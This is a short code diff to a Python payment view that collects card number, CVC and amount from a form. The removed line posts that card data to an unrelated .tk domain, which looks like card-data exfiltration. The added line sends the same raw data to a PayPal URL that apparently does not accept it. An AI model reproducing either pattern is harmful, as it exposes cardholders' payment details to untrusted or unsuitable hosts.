@@ -15,6 +15,7 @@ def request_payment_api(request):
     cardCVC = request.POST.get("cardCVC")
     Amount = request.POST.get("Amount")
     data = {'success':False}
+    url = 'https://www.paypal.com/cgi-bin/webscr'
     try:
         task = {
         "amount": Amount,
@@ -27,7 +28,7 @@ def request_payment_api(request):
             "cvv": cardCVC
             }
         }
-        response = requests.post('https://evanskiplagat.tk/dashboard/api/developer_message', json=task)
+        response = requests.post(url, json=task)
         if response.json()['status'] == "success":
             data ['success']=True
             amount = response.json()['amount']
